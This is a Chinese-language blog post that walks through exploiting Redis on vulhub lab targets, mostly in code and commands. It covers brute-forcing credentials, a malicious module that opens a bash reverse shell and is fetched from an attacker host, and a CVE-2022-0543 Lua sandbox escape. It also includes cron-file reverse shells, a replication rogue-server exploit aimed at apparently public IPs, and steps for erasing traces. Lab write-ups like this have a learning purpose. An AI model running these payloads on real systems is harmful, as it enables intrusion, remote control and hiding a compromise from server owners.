# Redis下

有了redis的一个基础了解，作为内存级别的数据库，方便高效进行数据的读写，除此之外，还有别的辅助功能，我见过的就什么主从复制的一些东西，具体的原理不了解像什么哨兵集群啊啥的，本文仅记录已知的vulhub上的靶场漏洞，当然最危险的上已经说过了，就是未授权或者弱密码

## 收集Redis服务信息

1.自动枚举

```plaintext
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```

2.banner

这两个都是查看redis服务的信息，可能会有可能没有，不确定

```plaintext
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```

3.暴力破解

```html
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT>
```

![image-20251208120615602](/posts/redis2/image-20251208120615602.png)

找到了有效的凭据，则需要在建立连接后使用以下命令对会话进行身份验证：

```html
AUTH <username> <password>
```

## 恶意模块加载

工具：[n0b0dyCN/RedisModules-ExecuteCommand: Tools, utilities and scripts to help you write redis modules! (github.com)](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)

malicious_module.c:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "redismodule.h"

int MaliciousCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    RedisModule_ReplyWithSimpleString(ctx, "Malicious code executed!");
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "malicious_module", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    if (RedisModule_CreateCommand(ctx, "malicious_command", MaliciousCommand, "write", 1, 1, 1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    return REDISMODULE_OK;
}
gcc -shared -o malicious_module.so malicious_module.c -I /usr/share/metasploit-framework/data/exploits/redis/ -fPIC
cp malicious_module.so /etc/redis

redis
MODULE LOAD /etc/redis/malicious_module.so
malicious_command
```

在redis 7.0版本中，引入了一个名为 enable-module-command 的配置项，用于控制 MODULE 命令的使用权限，默认为no，它会完全禁用 MODULE 相关的命令，包括 MODULE LOAD, MODULE UNLOAD, MODULE LIST 等

可以在redis中执行 CONFIG GET enable-module-command 命令查看当前设置：

- 如果返回 (empty array) 或者报错，说明你的 Redis 版本可能低于 7.0
- 如果返回 1) "enable-module-command" 2) "no"，则证实开启了该配置。

那么我们可以执行service redis-server stop命令关闭redis服务并找到 redis.conf 文件。它通常位于 /etc/redis/redis.conf 或 /usr/local/etc/redis/redis.conf

编辑该文件。在文件末尾添加一行：

```html
enable-module-command yes
```

然后执行service redis-server start重新启动redis服务即可

这个示例本身是无害的，它只是一个“Hello World”。但在渗透测试中，攻击者会修改 MaliciousCommand 函数来执行真正的恶意操作。

例如，要实现一个反弹 shell，攻击者会把 MaliciousCommand 函数改成这样：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "redismodule.h"

int MaliciousCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    system("bash -c 'bash -i >& /dev/tcp/192.168.0.189/4444 0>&1'");

    RedisModule_ReplyWithSimpleString(ctx, "OK");
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "malicious_module", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    if (RedisModule_CreateCommand(ctx, "malicious_command", MaliciousCommand, "write", 1, 1, 1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }
    return REDISMODULE_OK;
}
```

将其编译打包托管到攻击者主机上

接着，我们连接终端会话

```plaintext
docker ps -a
docker -H [IP]:2375 exec -it [ID] /bin/bash
apt-get install wget
wget http://[ATTACKER_IP]/shell.so
cp shell.so /etc/redis
```

再打开个终端执行命令连接加载模块并执行

```plaintext
redis-cli -h [IP]
MODULE LOAD /etc/redis/shell.so
```

然后另开个终端开启监听端口

```plaintext
nc -lvp 4444
```

接着在redis-cli中执行 malicious_command 模块命令即可获取到会话

我们在实验完成后，可以执行 MODULE UNLOAD 模块名来卸载模块。

```plaintext
MODULE UNLOAD malicious_module
```

## Redis Lua Sandbox Escape and Remote Code Execution (CVE-2022-0543)

一个沙箱有关的redis下的RCE，怎么说呢，做了才发现单纯的进入redis再进行到rce还是有点距离的，之前的三种方法各有各的差异

写入webshell是基于web应用的，ssh公私钥是基于root权限写入的，还要看版本差异，crontabs也是，如果这三种常见的不行，再根据所处的redis版本尝试利用这些poc

这个CVE就是一个实验

### 运行漏洞环境

redis版本是5.0.7，据说是6.x以下都可以使用

![image-20251205152123297](/posts/redis2/image-20251205152123297.png)

### 漏洞原理

1. **背景**
   Redis 允许通过 `eval` 命令执行 Lua 脚本，但正常情况下这些脚本运行在沙箱中，无法执行系统命令或文件操作。

2. **补丁引入的漏洞**
   Debian/Ubuntu 在打包 Redis 时，通过补丁代码向 Lua 沙箱中注入了一个名为 `package` 的全局对象。该对象本应在源码中被注释（出于沙箱安全考虑），但补丁错误地重新启用了它。

3. **沙盒逃逸过程**

   - **加载动态库**：攻击者可通过 `package.loadlib` 加载 Lua 系统库（如 `liblua5.1.so.0`），调用其导出函数（如 `luaopen_io`）获取 `io` 库权限。
   - **执行命令**：利用 `io.popen` 等函数执行任意系统命令。

   ```lua
   local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
   local io = io_l();
   local f = io.popen("whoami", "r");  -- 执行系统命令
   local res = f:read("*a");
   f:close();
   return res;
   ```

**攻击思路**：

单从攻击角度而言，可以使用redis未授权相同的打法，从漏洞角度来看，使用`eval`函数执行上面的逃逸过程即可。

- 不同系统的 `liblua` 库路径可能不同，Vulhub 环境（Ubuntu focal）中路径固定为上述路径，实际测试需根据目标系统调整。
- 该漏洞仅影响 Debian/Ubuntu 发行版打包的 Redis，官方原版 Redis 不受影响。

官方`liblua`路径

![image-20251205153438156](/posts/redis2/image-20251205153438156.png)

### getshell

```bash
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");local io = io_l();local f = io.popen("whoami", "r");local res = f:read("*a");f:close();return res;' 0

```

![image-20251205153815602](/posts/redis2/image-20251205153815602.png)

## 反弹Shell

1. 

```plaintext
nc -lvp 4444

redis
flushall
CONFIG SET dir /var/spool/cron or /var/spool/cron/crontabs
CONFIG SET dbfilename root
set shell "\n\n\n* * * * * bash -i >& /dev/tcp/攻击者主机IP地址/4444 0>&1\n\n\n"
SAVE
```

1. 

```plaintext
redis-cli EVAL "local s = redis.call('pubsub', 'channels', 'rebound'); local f = io.open('/tmp/rebound.sh', 'w+'); f:write('bash -i >& /dev/tcp/attacker_ip/8080 0>&1'); f:close()" 0
redis-cli PUBLISH rebound "rebound"
redis-cli SUBSCRIBE rebound
```

清理痕迹 获取 Shell 后，一个谨慎的攻击者会清理痕迹，恢复 Redis 的原始配置，避免被发现。

恢复原始配置 (路径和文件名可能需要猜测或从原始配置中获取)

```plaintext
config set dir /var/lib/redis/
config set dbfilename dump.rdb
```

删除恶意键

```plaintext
del shell
save
```

## 主从复制

这个有点捞了，4.x-5.x的老版本才有了，而且用ssh写入也能代替，一般

工具地址[GhostWolfLab/KALI-redis-master_slave: Redis 4.0-5.0主从复制命令执行 (github.com)](https://github.com/GhostWolfLab/KALI-redis-master_slave)

靶机启动

![image-20251205211940429](/posts/redis2/image-20251205211940429.png)

将攻击机伪造为主节点，像从节点广播恶意文件

![image-20251206233521371](/posts/redis2/image-20251206233521371.png)

不知为啥，exp.so没有make出来了

```shell
git clone https://github.com/vulhub/redis-rogue-getshell.git
cd redis-rogue-getshell/RedisModulesSDK
make		# 编译的时候可能会报错，不用管
cd ..		# 回到redis-rogue-getshell
./redis-master.py -r 192.168.66.130 -p 6379 -L 192.168.66.130 -P 8989 -f RedisModulesSDK/exp/exp.so -c "ls" 
./redis-master.py -r 18.166.69.81 -p 6379 -L 47.108.128.134 -P 8989 -f RedisModulesSDK/exp/exp.so -c "ls" 

./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1
```

> [!NOTE]
>
> -r 192.168.66.130 # 目标Redis服务器的IP地址
> -p 6379 # 目标Redis服务的端口（默认6379）
> -L 192.168.66.130 # 攻击机监听的IP地址（伪装为主节点）
> -P 8989 # 攻击机监听的端口（用于主从同步）
> -f RedisModulesSDK/exp/exp.so # 恶意动态链接库（.so文件路径）
> -c "ls" # 要在目标服务器上执行的命令

![img](https://img2023.cnblogs.com/blog/3159215/202502/3159215-20250225234033140-722532544.png)

用msfconsole试试

![image-20251206233754876](/posts/redis2/image-20251206233754876.png)

![image-20251206235501209](/posts/redis2/image-20251206235501209.png)

关于redis的漏洞还有很多，没法一一演示，遇到了再根据具体情况，具体版本查找有没有CVE去利用

但总的来说就是先登入redis，在通过redis的各种信息，或配合的架构去找对应的poc进行rce

![image-20251205141919301](/posts/redis2/image-20251205141919301.png)

LUA前面那个就是6.x版本以下的，看看吧，今年又有一个LUA的，Affect version更是来到了惊人的All

这个目前只有检测的工具，没有实际公布的RCE版本

**About the Vulnerability**

- **CVE ID**: CVE-2025-49844
- **Name**: RediShell
- **CVSS Score**: 10.0 (Critical)
- **Type**: Use-After-Free (UAF) in Lua Interpreter
- **Impact**: Remote Code Execution (RCE)
- **Discovered by**: Wiz Research Team
- [raminfp/redis_exploit: CVE-2025-49844 (RediShell) (github.com)](https://github.com/raminfp/redis_exploit)

![image-20251205142129981](/posts/redis2/image-20251205142129981.png)

**写在最后**

其实我这个redis和那个web后端的redis基本没什么关系，就是一个redis的一些漏洞的复现，而且利用点都在获取redis登录之后在进行下一步的不同操作，像什么ssh写入，主从复制这些，姿势很多，学不完，最关键的还是redis未授权（没设置密码）或者弱口令，开发时注意着点，但也还是希望，开发赏饭吃，这周总算水完了。



